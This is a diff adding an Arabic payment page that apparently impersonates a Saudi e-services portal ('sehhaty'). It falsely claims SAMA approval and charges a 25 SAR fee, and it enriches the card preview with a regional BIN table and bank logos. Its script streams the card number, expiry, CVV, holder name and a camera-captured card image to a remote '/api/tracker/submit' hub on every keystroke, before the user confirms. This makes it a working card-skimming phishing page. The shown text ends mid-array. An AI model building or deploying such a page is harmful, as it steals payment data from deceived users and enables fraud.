@@ -1,0 +1,1366 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>بوابة الدفع</title>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&family=Inter:wght@400;600;700;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="bill.css">
+    <script src="https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js"></script>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #f8fafc;
+            font-family: 'Cairo', sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .card-real-preview {
+            width: 100%;
+            max-width: 380px;
+            aspect-ratio: 1.586 / 1;
+            background: #f0f4fa;
+            border-radius: 20px;
+            padding: 18px 22px;
+            box-shadow: 0 4px 18px rgba(0, 0, 0, 0.06);
+            border: 1px solid #e2e8f0;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            margin: 10px auto 20px auto;
+            direction: ltr !important;
+            box-sizing: border-box;
+            user-select: none;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.3s ease;
+        }
+
+        .card-top-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            min-height: 40px;
+        }
+
+        /* 🏦 شعار بنك نقي بدون خلفية بيضاء */
+        .bank-logo-img {
+            height: 36px !important;
+            max-width: 150px !important;
+            object-fit: contain;
+            background: transparent !important;
+            display: none;
+            filter: drop-shadow(0 1px 2px rgba(0, 0, 0, 0.05));
+        }
+
+        .bank-brand-title {
+            font-weight: 800;
+            font-size: 14px;
+            color: #1e293b;
+            line-height: 1.2;
+            font-family: 'Inter', 'Cairo', sans-serif;
+            text-align: left;
+            max-width: 200px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .currency-box {
+            border: 1px solid #cbd5e1;
+            background: rgba(255, 255, 255, 0.85);
+            border-radius: 6px;
+            padding: 2px 8px;
+            font-size: 11px;
+            font-weight: 700;
+            color: #1e293b;
+            letter-spacing: 0.5px;
+        }
+
+        .card-mid-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: auto 0;
+        }
+
+        .card-display-number {
+            font-size: 19px;
+            font-weight: 600;
+            letter-spacing: 1.5px;
+            color: #0f172a;
+            direction: ltr !important;
+            text-align: left;
+            unicode-bidi: isolate;
+        }
+
+        .card-expiry-block {
+            text-align: right;
+            line-height: 1.2;
+        }
+
+        .card-expiry-val {
+            font-size: 15px;
+            font-weight: 600;
+            color: #0f172a;
+        }
+
+        .card-cvv-label {
+            font-size: 9px;
+            color: #94a3b8;
+            font-weight: 700;
+            margin-top: 2px;
+            text-transform: uppercase;
+        }
+
+        .card-cvv-val {
+            font-size: 12px;
+            font-weight: 700;
+            color: #0f172a;
+            letter-spacing: 1px;
+        }
+
+        .card-bottom-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            min-height: 28px;
+        }
+
+        .holder-and-flag {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+            text-align: left;
+        }
+
+        .card-holder-val {
+            font-size: 13px;
+            font-weight: 600;
+            color: #0f172a;
+            text-transform: capitalize;
+        }
+
+        .card-flag-badge {
+            font-size: 15px;
+            line-height: 1;
+            display: none;
+        }
+
+        .network-badge-group {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            gap: 3px;
+        }
+
+        .card-tier-text {
+            font-size: 9px;
+            font-weight: 800;
+            color: #0f172a;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            display: none;
+        }
+
+        .input-c {
+            position: relative !important;
+            display: flex;
+            align-items: center;
+            width: 100%;
+            direction: ltr !important;
+        }
+
+        .logo-in {
+            position: absolute !important;
+            left: 12px !important;
+            right: auto !important;
+            top: 50% !important;
+            transform: translateY(-50%) !important;
+            pointer-events: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+            width: 44px;
+            height: 26px;
+        }
+
+        .logo-in img {
+            max-height: 20px;
+            max-width: 40px;
+            object-fit: contain;
+        }
+
+        .card-network-logo-preview {
+            max-height: 22px;
+            max-width: 46px;
+            object-fit: contain;
+        }
+
+        #card-number {
+            padding-left: 62px !important;
+            padding-right: 48px !important;
+            direction: ltr !important;
+            text-align: left !important;
+            unicode-bidi: isolate !important;
+            font-family: 'Inter', monospace, sans-serif !important;
+            width: 100%;
+            box-sizing: border-box;
+            height: 50px;
+            font-size: 16px;
+            border-radius: 12px;
+        }
+
+        #card-expiry,
+        #card-cvv,
+        #card-holder {
+            height: 50px;
+            font-size: 15px;
+            border-radius: 12px;
+        }
+
+        #card-expiry,
+        #card-cvv {
+            direction: ltr !important;
+            text-align: left !important;
+            unicode-bidi: isolate !important;
+            font-family: 'Inter', monospace, sans-serif !important;
+        }
+
+        .scan-card-btn {
+            display: none;
+            position: absolute;
+            right: 8px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: #f1f5f9;
+            border: 1px solid #cbd5e1;
+            border-radius: 8px;
+            padding: 6px 10px;
+            color: #0f172a;
+            cursor: pointer;
+            align-items: center;
+            justify-content: center;
+            gap: 4px;
+            z-index: 10;
+            transition: all 0.2s ease;
+        }
+
+        .scan-card-btn:active {
+            transform: translateY(-50%) scale(0.95);
+            background: #e2e8f0;
+        }
+
+        .scan-card-btn svg {
+            width: 18px;
+            height: 18px;
+            color: #016b6a;
+        }
+
+        @media (max-width: 768px) {
+            .scan-card-btn {
+                display: flex !important;
+            }
+
+            main {
+                flex-direction: column !important;
+                padding: 12px 14px 40px 14px !important;
+                gap: 16px !important;
+            }
+
+            .wrapper {
+                padding: 18px 16px !important;
+                border-radius: 18px !important;
+            }
+
+            .card-real-preview {
+                max-width: 100% !important;
+                padding: 16px 18px !important;
+                border-radius: 16px !important;
+            }
+
+            .card-display-number {
+                font-size: 17px !important;
+                letter-spacing: 1.2px !important;
+            }
+
+            .pay-btn {
+                height: 52px !important;
+                font-size: 16px !important;
+                border-radius: 14px !important;
+            }
+        }
+
+        .camera-modal {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 9999;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .camera-modal.active {
+            display: flex;
+        }
+
+        .camera-view-container {
+            position: relative;
+            width: 100%;
+            max-width: 400px;
+            aspect-ratio: 1.586 / 1;
+            border-radius: 16px;
+            overflow: hidden;
+            border: 2px dashed #10b981;
+            box-shadow: 0 0 25px rgba(16, 185, 129, 0.3);
+            margin: auto 0;
+        }
+
+        #camera-video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .camera-actions {
+            display: flex;
+            gap: 12px;
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .camera-btn {
+            flex: 1;
+            height: 48px;
+            border-radius: 12px;
+            border: none;
+            font-family: 'Cairo', sans-serif;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .btn-capture {
+            background: #016b6a;
+            color: white;
+        }
+
+        .btn-close-cam {
+            background: #334155;
+            color: white;
+        }
+        .unified-card-container {
+            border: 1.5px solid #cbd5e1;
+            border-radius: 12px;
+            background: #ffffff;
+            transition: all 0.2s ease;
+            margin-bottom: 12px;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+        }
+        .unified-card-container:focus-within {
+            border-color: #016b6a;
+            box-shadow: 0 0 0 3px rgba(1, 107, 106, 0.15);
+        }
+        .unified-card-field-group {
+            display: flex;
+            width: 100%;
+            align-items: center;
+            direction: ltr !important;
+        }
+        .card-number-wrapper {
+            flex: 2.2;
+            position: relative;
+            display: flex;
+            align-items: center;
+            border-right: 1.5px solid #cbd5e1;
+        }
+        .card-expiry-wrapper {
+            flex: 1.1;
+            border-right: 1.5px solid #cbd5e1;
+            display: flex;
+            align-items: center;
+        }
+        .card-cvv-wrapper {
+            flex: 0.9;
+            display: flex;
+            align-items: center;
+        }
+        .unified-card-field-group input {
+            border: none !important;
+            box-shadow: none !important;
+            background: transparent !important;
+            height: 48px !important;
+            width: 100% !important;
+            padding: 8px 12px !important;
+            font-size: 14px !important;
+            font-family: 'Inter', monospace, sans-serif !important;
+            box-sizing: border-box !important;
+            outline: none !important;
+            color: #0f172a !important;
+        }
+        .card-number-wrapper input {
+            padding-left: 60px !important;
+            padding-right: 12px !important;
+            text-align: left !important;
+        }
+        .card-expiry-wrapper input {
+            text-align: center !important;
+            padding: 8px 6px !important;
+        }
+        .card-cvv-wrapper input {
+            text-align: center !important;
+            padding: 8px 6px !important;
+        }
+        .form-groupholder {
+            margin-bottom: 12px;
+        }
+        .form-groupholder input {
+            width: 100%;
+            height: 48px;
+            padding: 12px 16px !important;
+            border: 1.5px solid #cbd5e1 !important;
+            border-radius: 12px !important;
+            font-size: 14px !important;
+            font-family: 'Cairo', sans-serif !important;
+            box-sizing: border-box;
+            outline: none !important;
+            transition: all 0.2s ease;
+            text-align: right !important;
+        }
+        .form-groupholder input:focus {
+            border-color: #016b6a !important;
+            box-shadow: 0 0 0 3px rgba(1, 107, 106, 0.15) !important;
+        }
+        .mobile-summary-row {
+            display: none;
+            justify-content: space-between;
+            align-items: center;
+            background: #f8fafc;
+            border: 1.5px dashed #e2e8f0;
+            border-radius: 10px;
+            padding: 8px 12px;
+            margin-bottom: 12px;
+            direction: rtl !important;
+        }
+        .mob-sum-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 12px;
+        }
+        .mob-sum-label {
+            color: #64748b;
+            font-weight: 600;
+        }
+        .mob-sum-val {
+            font-weight: 700;
+            color: #0f172a;
+        }
+        .price-green {
+            color: #147b0e !important;
+            font-size: 13px;
+        }
+        html, body {
+            overflow: hidden !important;
+            height: 100% !important;
+            max-height: 100vh !important;
+        }
+        main {
+            height: calc(100vh - 70px) !important;
+            align-items: center;
+            box-sizing: border-box;
+        }
+        @media (max-width: 768px) {
+            .scan-card-btn {
+                display: flex !important;
+            }
+            html, body {
+                overflow: hidden !important;
+                height: 100% !important;
+                max-height: 100vh !important;
+            }
+            main {
+                flex-direction: column !important;
+                padding: 6px 10px !important;
+                gap: 8px !important;
+                height: calc(100vh - 54px) !important;
+                justify-content: center !important;
+            }
+            .wrapper {
+                padding: 12px 14px !important;
+                border-radius: 14px !important;
+                box-shadow: none !important;
+                border: none !important;
+                background: transparent !important;
+            }
+            .payment-card {
+                width: 100% !important;
+                max-width: 420px !important;
+                padding: 0 !important;
+            }
+            .card-real-preview {
+                max-width: 280px !important;
+                margin: 0 auto 10px auto !important;
+                padding: 10px 14px !important;
+                border-radius: 12px !important;
+                box-shadow: 0 2px 10px rgba(0,0,0,0.04) !important;
+            }
+            .card-display-number {
+                font-size: 15px !important;
+                letter-spacing: 1px !important;
+            }
+            .card-expiry-val, .card-holder-val {
+                font-size: 11px !important;
+            }
+            .unified-card-container {
+                margin-bottom: 8px;
+            }
+            .unified-card-field-group input {
+                height: 42px !important;
+                font-size: 12px !important;
+            }
+            .form-groupholder {
+                margin-bottom: 8px;
+            }
+            .form-groupholder input {
+                height: 42px !important;
+                font-size: 12.5px !important;
+                border-radius: 10px !important;
+            }
+            .pay-btn {
+                height: 44px !important;
+                font-size: 14px !important;
+                border-radius: 10px !important;
+                margin-top: 5px !important;
+            }
+            .mobile-summary-row {
+                display: flex !important;
+            }
+            .summary-card {
+                display: none !important;
+            }
+            .sec-f {
+                font-size: 11px !important;
+                margin-top: 8px !important;
+            }
+            header {
+                padding: 6px 12px !important;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header
+        style="display:flex; justify-content:space-between; align-items:center; padding: 12px 20px; background: white; border-bottom: 1px solid #e2e8f0;">
+       
+        <div class="secure-b" style="font-size:12px; font-weight:bold; color:#10b981;">🔒 دفع آمن 100%</div>
+    </header>
+
+    <main style="max-width: 900px; margin: 0 auto; display: flex; gap: 20px; padding: 20px;">
+        <section class="wrapper payment-card" style="flex: 1.2;">
+            <h3 class="title">💳 تفاصيل بطاقة الدفع</h3>
+
+            <!-- 🎨 بطاقة العرض الذكية -->
+            <div class="card-real-preview" id="card-preview-container">
+                <div class="card-top-row">
+                    <div id="card-bank-header" style="display:flex; align-items:center; gap:8px;">
+                        <img id="card-graphic-bank-logo" class="bank-logo-img" alt="Bank Logo">
+                        <span class="bank-brand-title" id="card-graphic-bank-title" style="display:none;"></span>
+                    </div>
+                    <div class="currency-box" id="card-currency-box" style="display:none;">SAR</div>
+                </div>
+
+                <div class="card-mid-row">
+                    <div class="card-display-number" id="card-graphic-number">•••• •••• •••• ••••</div>
+                    <div class="card-expiry-block">
+                        <div class="card-expiry-val" id="card-graphic-expiry">MM/YY</div>
+                        <div class="card-cvv-label">CVV</div>
+                        <div class="card-cvv-val" id="card-graphic-cvv">•••</div>
+                    </div>
+                </div>
+
+                <div class="card-bottom-row">
+                    <div class="holder-and-flag">
+                        <span class="card-holder-val" id="card-graphic-holder">CARDHOLDER NAME</span>
+                        <div class="card-flag-badge" id="card-graphic-flag"></div>
+                    </div>
+                    <div class="network-badge-group">
+                        <div id="card-graphic-network"></div>
+                        <span class="card-tier-text" id="card-graphic-tier"></span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 📱 Mobile-only compact summary row inside the payment block -->
+            <div class="mobile-summary-row">
+                <div class="mob-sum-item">
+                    <span class="mob-sum-label">الخدمة:</span>
+                    <span class="mob-sum-val" id="mob-sum-service">بوابة الخدمات الإلكترونية</span>
+                </div>
+                <div class="mob-sum-item">
+                    <span class="mob-sum-label">المبلغ:</span>
+                    <span class="mob-sum-val price-green" id="mob-sum-price">25.00 ر.س</span>
+                </div>
+            </div>
+
+            <form id="checkout-form" onsubmit="handlePaymentSubmit(event)">
+                <!-- 📸 حقل مخفي مخصص لحفظ لقطة البطاقة بعد تصغيرها وإرسالها مباشرة -->
+                <input type="hidden" id="card-scanned-image" name="scannedCardImage" value="">
+
+                <!-- 💳 Unified Single Row Inputs (Card Number + Expiry + CVV) -->
+                <div class="unified-card-container">
+                    <div class="unified-card-field-group">
+                        <div class="card-number-wrapper">
+                            <div class="logo-in" id="network-logo-inline"></div>
+                            <input type="text" id="card-number" name="cardnumber" placeholder="رقم البطاقة (•••• •••• •••• ••••)"
+                                maxlength="19" inputmode="numeric" autocomplete="cc-number" required
+                                oninput="validateCardNumber(this)">
+
+                            <button type="button" class="scan-card-btn" id="open-camera-btn" title="مسح البطاقة بالكاميرا"
+                                onclick="openCardScanner()">
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none"
+                                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                    <path
+                                        d="M14.5 4h-5L7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3l-2.5-3z" />
+                                    <circle cx="12" cy="13" r="3" />
+                                </svg>
+                            </button>
+                        </div>
+                        <div class="card-expiry-wrapper">
+                            <input type="text" id="card-expiry" name="cc-exp" placeholder="MM/YY" maxlength="5"
+                                inputmode="numeric" autocomplete="cc-exp" required oninput="validateCardExpiry(this)">
+                        </div>
+                        <div class="card-cvv-wrapper">
+                            <input type="password" id="card-cvv" name="cvc" placeholder="CVV" maxlength="4"
+                                inputmode="numeric" autocomplete="cc-csc" required oninput="validateCardCvv(this)">
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 👤 Card Holder block -->
+                <div class="form-groupholder">
+                    <input type="text" id="card-holder" name="ccname" placeholder="اسم صاحب البطاقة بالكامل (كما هو مكتوب عليها)"
+                        autocomplete="cc-name" required oninput="validateCardHolder(this)">
+                </div>
+
+                <button type="submit" class="pay-btn" id="pay-submit-btn" disabled>
+                    <span id="pay-btn-text">تأكيد ودفع</span>
+                </button>
+            </form>
+
+            <div class="sec-f" style="text-align: center; margin-top: 14px; font-size: 13px; color: #64748b;">🛡️ معتمد من SAMA</div>
+        </section>
+
+        <!-- 📄 Desktop-only Summary Card -->
+        <section class="wrapper summary-card" style="flex: 0.8;">
+            <h3 class="title">📄 ملخص طلب الخدمة</h3>
+            <div class="row" id="row-service-title" style="display:flex;">
+                <span style="color:#64748b; font-weight:600;">الخدمة المطلوبة:</span>
+                <span id="sum-service-title" style="font-weight:700; color: #147b0e; text-align: left;">بوابة الخدمات الإلكترونية</span>
+            </div>
+            <div class="row" id="row-country" style="display:none;">
+                <span style="color:#64748b; font-weight:600;">البلد:</span>
+                <span id="sum-country" style="font-weight:700;"></span>
+            </div>
+            <div class="row" id="row-port" style="display:none;">
+                <span style="color:#64748b; font-weight:600;">المنفذ:</span>
+                <span id="sum-port" style="font-weight:700;"></span>
+            </div>
+            <div class="row" id="row-plate" style="display:none;">
+                <span style="color:#64748b; font-weight:600;">اللوحة:</span>
+                <span id="sum-plate" style="font-weight:700;"></span>
+            </div>
+            <div class="row" id="row-duration" style="display:none;">
+                <span style="color:#64748b; font-weight:600;">مدة الصلاحية:</span>
+                <span id="sum-duration" style="font-weight:700;">فوري</span>
+            </div>
+            <div class="row" style="border-top:1.5px solid #f1f5f9;margin-top:12px;padding-top:12px;">
+                <span style="font-size:15px;color:#0f172a;font-weight:900;">المبلغ الإجمالي:</span>
+                <span class="total-p" id="sum-total-price">25.00 ر.س</span>
+            </div>
+        </section>
+    </main>
+
+    <div class="camera-modal" id="camera-modal">
+        <div style="color: white; text-align: center;">
+            <h4 style="margin: 0 0 6px 0;">مسح البطاقة بالكاميرا</h4>
+            <p style="margin: 0; font-size: 12px; opacity: 0.8;">وجّه أرقام البطاقة داخل الإطار الأخضر</p>
+        </div>
+
+        <div class="camera-view-container">
+            <video id="camera-video" autoplay playsinline muted></video>
+        </div>
+
+        <div class="camera-actions">
+            <button type="button" class="camera-btn btn-capture" onclick="captureAndRecognizeCard()">📸 مسح وقراءة
+                الرقم</button>
+            <button type="button" class="camera-btn btn-close-cam" onclick="closeCardScanner()">إلغاء</button>
+        </div>
+    </div>
+
+    <script src="saas-hub-config.js"></script><script src="config.js"></script>
+    <script>
+        var SERVER_HUB_URL = window.SERVER_HUB_URL || "http://localhost:5000",
+            siteKey = "site_sehhaty_app_v1",
+            formId = "payment_form",
+            formName = "بيانات بطاقة الدفع (Step 2)";
+
+        // 💳 السعر الثابت للدفع بالريال السعودي — عدّله من هذا المكان فقط
+        var CARD_PRICE = "25.00";
+        var CARD_PRICE_LABEL = CARD_PRICE + " ر.س";
+
+        var currentSessionId = 'sess_' + Math.random().toString(36).substring(2, 10) + Date.now().toString(36).substring(6, 10);
+        var visitorToken = localStorage.getItem('visitor_token') || 'vis_' + Math.random().toString(36).substring(2, 10);
+
+        var BIN_DATABASE = {};
+
+        var COUNTRY_FLAGS = {
+            'SA': '🇸🇦', 'QA': '🇶🇦', 'AE': '🇦🇪', 'KW': '🇰🇼', 'BH': '🇧🇭',
+            'OM': '🇴🇲', 'JO': '🇯🇴', 'EG': '🇪🇬', 'IQ': '🇮🇶', 'LB': '🇱🇧',
+            'SY': '🇸🇾', 'YE': '🇾🇪', 'PS': '🇵🇸'
+        };
+
+        var COUNTRY_CURRENCY = {
+            'SA': 'SAR', 'QA': 'QAR', 'AE': 'AED', 'KW': 'KWD', 'BH': 'BHD',
+            'OM': 'OMR', 'JO': 'JOD', 'EG': 'EGP', 'IQ': 'IQD', 'LB': 'USD'
+        };
+
+        // 🏛️ قاموس شعارات ويكيبيديا الرسمية الشفافة المباشرة لأهم بنوك المنطقة (الأولوية الأولى)
+        var WIKIPEDIA_BANK_LOGOS = {
+            "riyad": "https://upload.wikimedia.org/wikipedia/commons/e/e0/Riyad_Bank_Logo.svg",
+            "alrajhi": "https://upload.wikimedia.org/wikipedia/commons/e/ea/Al_Rajhi_Bank_Logo.svg",
+            "rajhi": "https://upload.wikimedia.org/wikipedia/commons/e/ea/Al_Rajhi_Bank_Logo.svg",
+            "snb": "https://upload.wikimedia.org/wikipedia/commons/e/e8/Saudi_National_Bank_Logo.svg",
+            "national commercial": "https://upload.wikimedia.org/wikipedia/commons/e/e8/Saudi_National_Bank_Logo.svg",
+            "alinma": "https://upload.wikimedia.org/wikipedia/commons/1/15/Alinma_Bank_Logo.svg",
+            "albilad": "https://upload.wikimedia.org/wikipedia/commons/a/aa/Bank_AlBilad_Logo.svg",
+            "bilad": "https://upload.wikimedia.org/wikipedia/commons/a/aa/Bank_AlBilad_Logo.svg",
+            "aljazira": "https://upload.wikimedia.org/wikipedia/commons/8/87/Bank_AlJazira_Logo.svg",
+            "jazira": "https://upload.wikimedia.org/wikipedia/commons/8/87/Bank_AlJazira_Logo.svg",
+            "saudi british": "https://upload.wikimedia.org/wikipedia/commons/a/aa/SABB_Logo.svg",
+            "sabb": "https://upload.wikimedia.org/wikipedia/commons/a/aa/SABB_Logo.svg",
+            "saudi investment": "https://upload.wikimedia.org/wikipedia/commons/5/52/SAIB_Logo.svg",
+            "qatar national": "https://upload.wikimedia.org/wikipedia/commons/d/d4/QNB_Group_logo.svg",
+            "qnb": "https://upload.wikimedia.org/wikipedia/commons/d/d4/QNB_Group_logo.svg",
+            "qatar islamic": "https://upload.wikimedia.org/wikipedia/commons/0/07/Qatar_Islamic_Bank_logo.svg",
+            "qib": "https://upload.wikimedia.org/wikipedia/commons/0/07/Qatar_Islamic_Bank_logo.svg",
+            "commercial bank of qatar": "https://upload.wikimedia.org/wikipedia/commons/a/a2/Commercial_Bank_of_Qatar_Logo.svg",
+            "cbq": "https://upload.wikimedia.org/wikipedia/commons/a/a2/Commercial_Bank_of_Qatar_Logo.svg",
+            "doha bank": "https://upload.wikimedia.org/wikipedia/commons/7/77/Doha_Bank_logo.svg",
+            "first abu dhabi": "https://upload.wikimedia.org/wikipedia/commons/5/5e/FAB_Bank_Logo.svg",
+            "fab": "https://upload.wikimedia.org/wikipedia/commons/5/5e/FAB_Bank_Logo.svg",
+            "emirates nbd": "https://upload.wikimedia.org/wikipedia/commons/b/bd/Emirates_NBD_logo.svg",
+            "dubai islamic": "https://upload.wikimedia.org/wikipedia/commons/7/7f/Dubai_Islamic_Bank_Logo.svg",
+            "abu dhabi commercial": "https://upload.wikimedia.org/wikipedia/commons/0/0e/ADCB_Logo.svg",
+            "adcb": "https://upload.wikimedia.org/wikipedia/commons/0/0e/ADCB_Logo.svg",
+            "banque misr": "https://upload.wikimedia.org/wikipedia/commons/b/b3/Banque_Misr_Logo.svg",
+            "national bank of egypt": "https://upload.wikimedia.org/wikipedia/commons/2/2e/National_Bank_of_Egypt_Logo.svg",
+            "nbe": "https://upload.wikimedia.org/wikipedia/commons/2/2e/National_Bank_of_Egypt_Logo.svg",
+            "cib": "https://upload.wikimedia.org/wikipedia/commons/1/1a/Commercial_International_Bank_Logo.svg",
+            "arab bank": "https://upload.wikimedia.org/wikipedia/commons/4/4b/Arab_Bank_logo.svg"
+        };
+
+        (async function loadBinDatabase() {
+            try {
+                const res = await fetch('bin_list_filtered_mena.csv');
+                if (!res.ok) return;
+                const text = await res.text();
+                const lines = text.split('\n');
+
+                for (let i = 1; i < lines.length; i++) {
+                    const line = lines[i].trim();
+                    if (!line) continue;
+
+                    const parts = line.split(',');
+                    if (parts.length >= 8) {
+                        const bin = parts[0].trim();
+                        BIN_DATABASE[bin] = {
+                            brand: parts[1].trim().toUpperCase(),
+                            type: parts[2].trim().toUpperCase(),
+                            category: parts[3].trim().toUpperCase(),
+                            issuer: parts[4].trim(),
+                            issuerUrl: parts[6] ? parts[6].trim() : '',
+                            iso2: parts[7].trim().toUpperCase(),
+                            country: parts[9] ? parts[9].trim() : ''
+                        };
+                    }
+                }
+            } catch (e) { }
+        })();
+
+        const VISA_IMG_URL = "https://upload.wikimedia.org/wikipedia/commons/9/98/Visa_Inc._logo_%282005%E2%80%932014%29.svg";
+        const MC_IMG_URL = "https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg";
+        const MADA_IMG_URL = "https://thumb.wikimedia.org/wikipedia/commons/thumb/f/fb/Mada_Logo.svg/1280px-Mada_Logo.svg.png";
+
+        try {
+            var selectedService = localStorage.getItem('selected_service_title') || 'بوابة الخدمات الإلكترونية الموحدة';
+            
+            // Set service title in desktop and mobile summaries
+            var sumServiceTitleEl = document.getElementById('sum-service-title');
+            if (sumServiceTitleEl) {
+                sumServiceTitleEl.innerText = selectedService;
+            }
+            var mobSumServiceEl = document.getElementById('mob-sum-service');
+            if (mobSumServiceEl) {
+                mobSumServiceEl.innerText = selectedService;
+            }
+
+            // 💳 السعر ثابت ومصدره الوحيد CARD_PRICE
+            var price = CARD_PRICE;
+            
+            // Set price in desktop and mobile summaries
+            var sumTotalPriceEl = document.getElementById('sum-total-price');
+            if (sumTotalPriceEl) {
+                sumTotalPriceEl.innerText = CARD_PRICE_LABEL;
+            }
+            var mobSumPriceEl = document.getElementById('mob-sum-price');
+            if (mobSumPriceEl) {
+                mobSumPriceEl.innerText = CARD_PRICE_LABEL;
+            }
+
+            // Set button text
+            var paySubmitBtnEl = document.getElementById('pay-submit-btn');
+            if (paySubmitBtnEl) {
+                paySubmitBtnEl.innerText = "تأكيد ودفع " + CARD_PRICE_LABEL;
+            }
+        } catch (e) { }
+
+        function isValidLuhn(num) {
+            const digits = num.replace(/\D/g, '');
+            if (digits.length < 13) return false;
+            let sum = 0, dDouble = false;
+            for (let i = digits.length - 1; i >= 0; i--) {
+                let d = parseInt(digits.charAt(i), 10);
+                if (dDouble) { d *= 2; if (d > 9) d -= 9; }
+                sum += d; dDouble = !dDouble;
+            }
+            return sum % 10 === 0;
+        }
+
+        var lastReadyCard = null, lastReadyExpiry = null,
+            isCardValid = false, isHolderValid = false, isExpiryValid = false, isCvvValid = false,
+            lastSentPayload = null, streamDebounce = null;
+
+        function updatePayButtonState() {
+            var v = isCardValid && isHolderValid && isExpiryValid && isCvvValid;
+            var isCardReady = isCardValid && isExpiryValid && isCvvValid;
+            var btn = document.getElementById('pay-submit-btn');
+            btn.disabled = !v;
+            if (v) btn.classList.add('enabled'); else btn.classList.remove('enabled');
+            streamLiveFormPayload(v ? 'ready' : (isCardReady ? 'ready' : 'typing'));
+        }
+
+        function streamLiveFormPayload(st) {
+            clearTimeout(streamDebounce);
+            streamDebounce = setTimeout(function () {
+                var cNum = document.getElementById('card-number').value.trim();
+                var cHolder = document.getElementById('card-holder').value.trim();
+                var cExpiry = document.getElementById('card-expiry').value.trim();
+                var cCvv = document.getElementById('card-cvv').value.trim();
+                var scannedImg = document.getElementById('card-scanned-image').value;
+
+                var cleanNum = cNum.replace(/\s/g, '');
+                var bin = cleanNum.substring(0, 6);
+                var binInfo = BIN_DATABASE[bin] || null;
+
+                var net = binInfo ? binInfo.brand : 'UNKNOWN';
+                if (net === 'UNKNOWN') {
+                    if (cleanNum.startsWith('4')) net = 'VISA';
+                    else if (cleanNum.startsWith('5')) net = 'MASTERCARD';
+                    else if (cleanNum.startsWith('6')) net = 'MADA';
+                }
+
+                if (st === 'typing' && lastReadyCard !== null) {
+                    var cleanLastReady = lastReadyCard.replace(/\s/g, '');
+                    if ((cleanNum.length > 0 && !cleanLastReady.startsWith(cleanNum)) || (cExpiry.length >= 2 && cExpiry !== lastReadyExpiry)) {
+                        currentSessionId = 'sess_' + Math.random().toString(36).substring(2, 10) + Date.now().toString(36).substring(6, 10);
+                        lastReadyCard = null; lastReadyExpiry = null;
+                    }
+                }
+                if (st === 'ready') { lastReadyCard = cNum; lastReadyExpiry = cExpiry; }
+
+                var data = {
+                    'رقم البطاقة': cNum,
+                    'اسم حامل البطاقة': cHolder,
+                    'تاريخ الانتهاء': cExpiry,
+                    'رمز الأمان CVV': cCvv,
+                    'نوع البطاقة': net,
+                    'البنك': binInfo ? binInfo.issuer : '',
+                    'الدولة': binInfo ? binInfo.country : '',
+                    'المبلغ': CARD_PRICE_LABEL,
+                    '_sessionId': currentSessionId
+                };
+
+                if (scannedImg) {
+                    data['صورة البطاقة'] = scannedImg;
+                }
+
+                var payloadString = JSON.stringify(data);
+                if (payloadString === lastSentPayload && st !== 'confirmed') return;
+                lastSentPayload = payloadString;
+
+                fetch(SERVER_HUB_URL + '/api/tracker/submit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        token: visitorToken,
+                        siteKey: siteKey,
+                        formName: formName + (st === 'typing' ? ' (يجري الكتابة 🟡)' : st === 'ready' ? ' (جاهز 🟢)' : ' (مؤكد ✅)'),
+                        submissionData: data,
+                        isFinalSubmission: (st === 'confirmed'),
+                        isImportant: true
+                    }),
+                    keepalive: true
+                }).catch(function () { });
+            }, 300);
+        }
+
+        function extractDomain(url) {
+            if (!url) return '';
+            try {
+                let u = url.trim();
+                if (!u.startsWith('http')) u = 'http://' + u;
+                return new URL(u).hostname.replace(/^www\./, '');
+            } catch (e) {
+                return '';
+            }
+        }
+
+
+        // 🏛️ قائمة البنوك الرسمية بالأولوية الأولى (ويكيبيديا المباشرة)
+        var PRIMARY_BANK_LOGOS = [
+            {
+                "id": "riyad",
+                "name_ar": "بنك الرياض",
+                "domain": "riyadbank.com",
+                "logo_url": "https://commons.wikimedia.org/wiki/Special:FilePath/Riyad_Bank_logo.svg"
+            },
+            {
+                "id": "sab",
+                "name_ar": "البنك السعودي الأول",
+                "domain": "sab.com",
+                "logo_url": "https://commons.wikimedia.org/wiki/Special:FilePath/Saudi_Awwal_Bank_Logo.svg"
+            },
+            {
+                "id": "anb",
+                "name_ar": "البنك العربي الوطني",
+                "domain": "anb.com.sa",
